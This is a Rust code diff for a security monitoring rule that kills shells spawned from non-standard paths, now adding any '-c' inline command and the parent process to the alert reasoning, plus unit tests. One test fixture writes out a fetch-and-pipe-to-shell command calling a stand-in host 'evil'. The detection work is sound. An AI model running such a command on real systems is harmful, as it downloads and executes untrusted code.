@@ -51,7 +51,14 @@ impl Rule for R017ShellFromNonstandardPath {
     }
 
     fn evaluate(&self, event: &Event) -> Option<Verdict> {
-        let Event::ProcessSpawn { comm, filename, .. } = event else {
+        let Event::ProcessSpawn {
+            comm,
+            filename,
+            argv,
+            parent_comm,
+            ..
+        } = event
+        else {
             return None;
         };
         if !SHELL_COMMS.contains(&comm.as_str()) {
@@ -63,14 +70,30 @@ impl Rule for R017ShellFromNonstandardPath {
         if self.allowlist.contains(comm) {
             return None;
         }
+        // D5: `-c <payload>` is inline command exec (the reverse-shell
+        // one-liner shape); parent_comm gives provenance context (§5.2 —
+        // sshd-spawned vs cron/nginx-spawned). Both additive.
+        let mut reasoning = String::from(
+            "Interactive shell (sh/bash/dash) exec from a non-standard \
+             path — copied/renamed shell / reverse-shell shape \
+             (T1059.004); posture → ENGAGED",
+        );
+        if let Some(idx) = argv.iter().position(|a| a == "-c") {
+            if let Some(payload) = argv.get(idx + 1) {
+                reasoning = format!("{reasoning} — inline command (-c): {payload}");
+            } else {
+                reasoning = format!("{reasoning} — inline -c command");
+            }
+        }
+        if !parent_comm.is_empty() {
+            reasoning = format!("{reasoning}; spawned by {parent_comm}");
+        }
         Some(build_verdict(
             self,
             event,
             ResponseAction::KillProcess,
             Severity::High,
-            "Interactive shell (sh/bash/dash) exec from a non-standard \
-             path — copied/renamed shell / reverse-shell shape \
-             (T1059.004); posture → ENGAGED",
+            &reasoning,
         ))
     }
 }
@@ -78,7 +101,7 @@ impl Rule for R017ShellFromNonstandardPath {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::decision::rules::testutil::spawn;
+    use crate::decision::rules::testutil::{spawn, spawn_full};
 
     fn rule() -> R017ShellFromNonstandardPath {
         R017ShellFromNonstandardPath::new(Arc::new(CommAllowlist::default()))
@@ -95,6 +118,32 @@ mod tests {
             assert_eq!(v.action, ResponseAction::KillProcess);
             assert_eq!(v.severity, Severity::High);
         }
+    }
+
+    #[test]
+    fn argv_inline_command_and_parent_enrich_reasoning() {
+        let ev = spawn_full(
+            "sh",
+            "/dev/shm/sh",
+            1000,
+            &["sh", "-c", "curl http://evil|sh"],
+            "sshd",
+        );
+        let v = rule().evaluate(&ev).expect("fires");
+        assert_eq!(v.severity, Severity::High); // base preserved
+        assert!(v
+            .reasoning
+            .contains("inline command (-c): curl http://evil|sh"));
+        assert!(v.reasoning.contains("spawned by sshd"));
+    }
+
+    #[test]
+    fn fires_without_argv_graceful_degrade() {
+        let v = rule()
+            .evaluate(&spawn("bash", "/dev/shm/bash"))
+            .expect("fires");
+        assert!(!v.reasoning.contains("inline command"));
+        assert!(!v.reasoning.contains("spawned by"));
     }
 
     #[test]
